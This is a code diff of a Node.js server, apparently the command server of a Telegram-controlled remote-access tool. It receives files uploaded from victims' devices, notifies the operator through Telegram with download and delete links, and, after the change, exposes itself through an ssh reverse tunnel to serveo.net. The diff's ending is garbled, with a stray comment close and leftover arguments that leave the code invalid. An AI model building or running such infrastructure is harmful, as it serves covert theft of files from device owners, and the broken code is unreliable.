@@ -1,88 +1,105 @@
 const express = require('express');
 const webSocket = require('ws');
-const http = require('http')
-const telegramBot = require('node-telegram-bot-api')
-const uuid4 = require('uuid')
+const http = require('http');
+const TelegramBot = require('node-telegram-bot-api');
+const uuid4 = require('uuid');
 const multer = require('multer');
-const bodyParser = require('body-parser')
+const bodyParser = require('body-parser');
 const axios = require("axios");
-
-const token = process.env.bot_token
-const id = process.env.bot_id
-const address = 'https://www.google.com'
-
-const app = express();
-const appServer = http.createServer(app);
-const appSocket = new webSocket.Server({server: appServer});
-const appBot = new telegramBot(token, {polling: true});
-const appClients = new Map()
-
-const upload = multer({ dest: 'uploadedFile/' });
+const readline = require('readline');
+const { exec } = require('child_process');
 const fs = require('fs');
 
-app.use(bodyParser.json());
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+});
 
-let currentUuid = ''
-let currentNumber = ''
-let currentTitle = ''
+rl.question('Enter your bot token: ', (token) => {
+  rl.question('Enter your chat ID: ', (id) => {
+    rl.question('Enter your Telegram username: ', (telegramUsername) => {
+      if (!token) {
+        console.error('Telegram Bot Token not provided!');
+        process.exit(1);
+      }
 
-app.get('/', function (req, res) {
-    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
-})
+      const app = express();
+      const appServer = http.createServer(app);
+      const appSocket = new webSocket.Server({ server: appServer });
+      const appBot = new TelegramBot(token, { polling: true });
+      const appClients = new Map();
 
-app.get('/getFile/*', function (req, res) {
-  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
-  fs.stat(filePath, function(err, stat) {
-    if(err == null) {
-      res.sendFile(filePath)
-    } else if (err.code === 'ENONET') {
-      res.send(`<h1>File not exist</h1>`)
-    } else {
-      res.send(`<h1>Error, not found</h1>`)
-    }
-  });
-})
+      const upload = multer({ dest: 'uploadedFile/' });
 
-app.get('/deleteFile/*', function (req, res) {
-  const fileName = req.params[0]
-  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
-  fs.stat(filePath, function(err, stat) {
-    if (err == null) {
-      fs.unlink(filePath, (err) => {
-        if (err) {
-          res.send(`<h1>The file "${fileName}" was not deleted</h1>` + `<br><br>` + `<h1>!Try Again!</h1>`)
-        } else {
-          res.send(`<h1>The file "${fileName}" was deleted</h1>` + `<br><br>` + `<h1>Success!!!</h1>`)
-        }
+      app.use(bodyParser.json());
+
+      let currentUuid = '';
+      let currentNumber = '';
+      let currentTitle = '';
+
+      app.get('/', function (req, res) {
+        res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>');
       });
-    } else if (err.code === 'ENOENT') {
-      // file does not exist
-      res.send(`<h1>"${fileName}" does not exist</h1>` + `<br><br>` + `<h1>The file dosent exist to be deleted.</h1>`)
-    } else {
-      res.send('<h1>Some other error: </h1>', err.code)
-    }
-  });
-})
 
+      app.get('/getFile/*', function (req, res) {
+        const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
+        fs.stat(filePath, function (err, stat) {
+          if (err == null) {
+            res.sendFile(filePath);
+          } else if (err.code === 'ENONET') {
+            res.send('<h1>File not exist</h1>');
+          } else {
+            res.send('<h1>Error, not found</h1>');
+          }
+        });
+      });
 
+      app.get('/deleteFile/*', function (req, res) {
+        const fileName = req.params[0];
+        const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
+        fs.stat(filePath, function (err, stat) {
+          if (err == null) {
+            fs.unlink(filePath, (err) => {
+              if (err) {
+                res.send(`<h1>The file "${fileName}" was not deleted</h1><br><br><h1>!Try Again!</h1>`);
+              } else {
+                res.send(`<h1>The file "${fileName}" was deleted</h1><br><br><h1>Success!!!</h1>`);
+              }
+            });
+          } else if (err.code === 'ENOENT') {
+            res.send(`<h1>"${fileName}" does not exist</h1><br><br><h1>The file doesn't exist to be deleted</h1>`);
+          } else {
+            res.send('<h1>Error, not found</h1>');
+          }
+        });
+      });
 
-app.post("/uploadFile", upload.single('file'), (req, res) => {
-    const name = req.file.originalname
-    const file_name = req.file.filename
-    const filePath = __dirname + '/uploadedFile/' +encodeURIComponent(name)
-    const host_url = req.protocol + '://' + req.get('host')
-    fs.rename(__dirname + '/uploadedFile/' + file_name, __dirname + '/uploadedFile/' +encodeURIComponent(name), function(err) { 
-      if ( err ) console.log('ERROR: ' + err);
+      appBot.on('message', (msg) => {
+        const chatId = msg.chat.id;
+        appBot.sendMessage(chatId, `Hello! Your chat ID is ${id}`);
+      });
+
+      console.log(`Bot is running with chat ID: ${id}`);
+
+      // Set up SSH tunnel
+      const sshCommand = `ssh -R ${telegramUsername}:80:localhost:8999 -o GatewayPorts=no serveo.net`;
+      exec(sshCommand, (error, stdout, stderr) => {
+        if (error) {
+          console.error(`Error setting up SSH tunnel: ${error.message}`);
+          return;
+        }
+        if (stderr) {
+          console.error(`SSH tunnel stderr: ${stderr}`);
+          return;
+        }
+        console.log(`SSH tunnel stdout: ${stdout}`);
+      });
+
+      rl.close();
     });
-    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ` + name + ` \n 𝙵𝚒𝚕𝚎 𝙸𝚍: ` + file_name + `\n\n 𝙵𝚒𝚕𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n 𝙳𝚎𝚕𝚎𝚝𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
-/*
-   {
-     parse_mode: "HTML",
-       reply_markup: {
-         inline_keyboard: [
-           [{text: '𝗗𝗲𝗹𝗲𝘁𝗲 𝗙𝗶𝗹𝗲', callback_data: `delete_file:${name}`}]
-         ]}
-   }, 
+  });
+});
+
    */
 {parse_mode: "HTML", disable_web_page_preview: true})
    res.send('')
